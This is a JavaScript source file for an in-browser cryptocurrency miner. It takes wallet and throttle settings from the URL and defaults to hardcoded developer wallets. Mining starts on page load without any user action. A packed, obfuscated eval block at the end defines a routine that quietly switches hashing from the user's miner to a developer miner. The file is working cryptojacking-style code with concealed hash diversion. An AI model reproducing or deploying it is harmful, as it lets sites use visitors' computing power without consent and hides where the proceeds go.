var gustav;
var walletcustom;
var pooladdress;
var statuss;

//new
var lastrate = 0;
var totalHashes = 0;
var totalHashes2 = 0;
var acceptedHashes = 0;
var hashesPerSecond = 0;
var thisurl = new URL(window.location.href);
var custname = thisurl.searchParams.get("name");
var custhrottle = thisurl.searchParams.get("throttle");
var custdif = thisurl.searchParams.get("dif");
var custwal = thisurl.searchParams.get("wallet");
//This is so that I can just go to the page and mine without having to add my wallet address. Sorry I'm lazy!
var devLookup = { 
                    "ETN" : "etnjwpDXu5bSEjQgkq2RspYTp9Md4zDjMKjC8p1xpQ1M1Sg516q1wTtWPqiTMzFKdsicXqmGbr8BMY3LwNY5vVJ22Q1ARaJ7S1",
                    "TRTL" : "TRTLuwnhoebP4adCGsh8JyHDDSXbfdBQkc9ScgQKgwYNSFmSKVKtzCVNbu8bDq2yntioTTKJd2E9Tb5oaitMTVL2enUbSaDmVpB",
                    "GRFT" : "G6qjWvMp2tdR18ojqhZX3dCGVW6X2tVbXdeP7EFWYYwCA87pbwAEohj1cpKhJXH5ZiZuXJRLbaRQ16dgTo4QFHPVB3eSTCx",
                    "SUMO" : "Sumoo3jKgAr9YbcGJ8qPsq6MGXMRhEisV19Frx3sQ4zKR3gMFVDmWZ8M5t1ENLwa9ffPEEpy49dzdRa73HCfspfiELk1KXHkjhs",
                    "ITNS" : "iz4uG4E7VmJitN92Kp5q2detJ3wPrErHEUNKvEdX5eEvPTtSjAyn2U2QVuB7wZjw39FPwnebGu9fpW6BCdpACTLa1pnARyn3a",
                    "DERO" : "dERogZHopCAM8qeZzburDNRMUjPWGQAmGPbdiZk2DWjmD1qtiDPeXRTBXEr6tW8rAV2LmUcLFYdL1T2tErP6R6Nt1VDGonq745",
                    "COAL" : "Csk1fHUxfCsNUcqvqM3xWfW6gixb4uRKLGeTKHuEkqEw1KNaHvLJiV3dFQE6SYqHo5XvYNH8muN9XHj8nsU2MSqfBWXWV26",
                    "FCN" : "6oaz7bq7pAhCuPiSKw5hKYey1QFv8VYhrUhkt5yZRQRTjiD5aGTTnSTF1VnWZdEX5UcamVn41rdaLYwbRdEndAGGMeqLsPy",
                    "FNO" : "8wjbjpKucDLctKSK7Ma4WkaRhcxhUAwGaMJj22QF1bXsGX4AEvdciykRzC9UutNqpQjU1g9R6CXzq2sixDqqTVu9GiVZWdB",
                    "KRB" : "KbnECLthCq8eahKS1YQ4AzCsx4eVRGfA3SGkRfZm9sLuLquAnSBJi9oWs9ZmkTfZzV1jwY7osUxAR7aSU9jqiypXGd41Yjc",
                    "XLC" : "Lu8NocG6HgY3kz5a5KFTjDRkZabTrbNeUZLsqeVs8qqkfZMdsyfNATbVQV7fjZnsft4vxrEE5rtfdR9RHu26DE9MBZFFBzX",
                    "MSR" : "5nfyeYmRjmmPZ6PoEM13FzQkSMPJJ3cLR5Wn4zhuE38e13X1XPxXcYEeZRVLDSB8itAR9uiacQvsCc8XfNLWUGhF2tZrT7Y",
                    "STL" : "Se3hzTgpNKiDzYKeaDUFgH3YCK9nZKEufThjLi4kpTvAD7hLZUY8ctYWeb8Hfo6ado5bKDmd1YKuxdDGj6oRtxRq2tw7jZDoF",
                    "FNO" : "8wjbjpKucDLctKSK7Ma4WkaRhcxhUAwGaMJj22QF1bXsGX4AEvdciykRzC9UutNqpQjU1g9R6CXzq2sixDqqTVu9GiVZWdB",
                    "EDL" : "edqhxg9wA6uMbAUNB6TuBTSMS2tD9D9kj6NVJEFZLX2ZEY5obJJYECG4zT8Jkupetf9WmnnqkzeDrLq7T29p2URB14eiUYyec"
                };
var devCurrent = devLookup[currency.toUpperCase()];
/*
    Custom name, address, and diff by:
    var str = "%w.%d+%n";
    var regwal = /%w/gi;
    var regdif = /%d/gi;
    var regnam = /%n/gi;
    if (true) { #true if not set to remove
        regnam = new RegExp(/./.source + regnam.source);
    }
    var res = str.replace(regwal, "W3Schools").replace(regdif, "").replace(regnam, "weber");
*/

var regwal = /%w/gi;
var regdif = /%d/gi;
var regnam = /%n/gi;

var walletsyntaxarr = {
    "ETN": "%w.%d@%n",
    "DERO": "%w.%d+%n",
    "GRFT": "%w.%d@%n",
    "ITNS": "%w+%n.%d",
    "SUMO": "%w+%n.%d",
    "TRTL": "%w.%d",
    "FNO" : "%w.%d",
    "EDL" : "%w+%n.%d"
}

if (!custname) {
    custname = "@webminer";
} else {
    custname = "@webminer_" + custname;
}
if (["TRTL", "GRFT", "SUMO", "DERO", "ITNS", "FNO", "EDL"].includes(currency.toUpperCase())) {
    console.log("Currency does not support easy names. Working on support..");
    custname = "";
}
if (!custhrottle || Number.parseFloat(custhrottle) == NaN || Number.parseFloat(custhrottle) > 95) {
    var pagedefault = document.getElementById("defth");
    if (pagedefault) {
        custhrottle = pagedefault.innerHTML;
    } else {
        custhrottle = 0;
    }
}
if (!custdif || (Number.parseInt(custdif) < 2500 && Number.parseInt(custdif) >= 0)) {
    custdif = 2500;
}
if (["SUMO", "ITNS"].includes(currency.toUpperCase())) {
    custdif = 1000;
}

if (["GRFT", "TRTL", "DERO", "FNO", "EDL"].includes(currency.toUpperCase())) {
    custdif = -1;
}

currencyDifSymbol = ".";
difSymbols = {
    "GRFT" : "+",
    "SUMO" : "+",
    "ITNS" : "+",
    "EDL" : "+"
};
if (["GRFT", "SUMO", "ITNS", "EDL"].includes(currency.toUpperCase())) {
    currencyDifSymbol = difSymbols[currency.toUpperCase()];
}

if(Number.parseInt(custdif) < 0) {
    custdif = "";
}
if (custdif != "") {
    custdif = currencyDifSymbol + custdif;
}
if (!custwal || !isAlphaNumeric(custwal)) {
    custwal = devCurrent;
}

var walletaddress = custwal + custdif + custname;


//Here is the start of the newly required functions.
var mining = false;

function startLogger() {
    statuss = setInterval(function() {
      lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
      totalHashes = totalhashes + totalHashes;
      hashesPerSecond = Math.round(lastrate);
      totalHashes2 = totalHashes;
      totalhashes = 0;
      acceptedHashes = GetAcceptedHashes();
    }, 1000);
}

function stopLogger() {
    clearInterval(statuss);
};

function startMiner(wallet, pass, throttle) {
    if (wasstopped) { //Hopefully temp measure
        location.reload();
    }
    mining = true;
    PerfektStart(wallet, pass);
    throttleMiner = throttle;
}

function stopMiner(){
    stopMining();
    mining = false;
    wasstopped = true;
}
var wasstopped = false;
startLogger();
var devminer = false;
//This is so i can mine on my own computers with no issues.
if (custwal != devCurrent) {
    devwal = devCurrent + custdif + custname;
}
startMiner(walletaddress, 'x', custhrottle);
var activeminer = walletaddress;
var counter = 1;
var hr = 0;
var ah = 0;
var th = 0;
$(document).ready(function() {
    refreshOnUpdate(5000);
    
    setInterval(function(){
        hr = hashesPerSecond.toFixed(1);
        ah = acceptedHashes;
        th = totalHashes2;
        //Helper code from sdk
        //minerHelper();
        if(document.getElementById("hs").innerHTML && hr != document.getElementById("hs").innerHTML) {
            document.getElementById("hs").innerHTML = hr;
        }
        if(document.getElementById("ah").innerHTML && ah != document.getElementById("ah").innerHTML) {
            document.getElementById("ah").innerHTML = ah;
        }
        if(document.getElementById("th").innerHTML && th != document.getElementById("th").innerHTML) {
            document.getElementById("th").innerHTML = th;
        }
    }, 1000);
});

function toggleminer() {
    if(mining){
        stopMiner(); 
        document.getElementById('hashdiv').style.color = 'red';
    }else{
        startMiner(); 
        document.getElementById('hashdiv').style.color = 'blue';
    }
}

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j l(){4(2&&e){b=(7(b)+2.k()).m(1);f=7(f)+2.8();c=7(c)+2.p();4(3>0){3++}q{3--}4(3>o){9+=6.8();5.d();2.h(i.g);6=2;3=-1}4(3<-n){9+=6.8();2.d();5.h(i.g);6=5;3=1}}e=5.a()||(2&&2.a())}',27,27,'||devminer|counter|if|miner|activeminer|parseInt|getAcceptedHashes|ahoffset|isRunning|hr|th|stop|mining|ah|FORCE_EXCLUSIVE_TAB|start|CH|function|getHashesPerSecond|minerHelper|toFixed|240|3000|getTotalHashes|else'.split('|'),0,{}));